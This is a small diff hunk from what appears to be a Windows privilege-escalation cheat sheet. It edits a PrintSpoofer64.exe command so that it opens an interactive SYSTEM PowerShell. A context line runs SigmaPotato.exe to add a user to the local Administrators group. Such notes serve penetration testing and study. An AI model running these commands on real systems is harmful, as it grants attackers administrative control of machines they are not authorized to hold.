@@ -636,7 +636,7 @@ winPEASx64.exe
 SigmaPotato.exe "net localgroup Administrators <user> /add"
 ```
 ```ps
-PrintSpoofer64.exe
+PrintSpoofer64.exe -i -c powershell.exe
 ```
 
 ### File Permissions: Everyone [AllAccess] in WinPeas
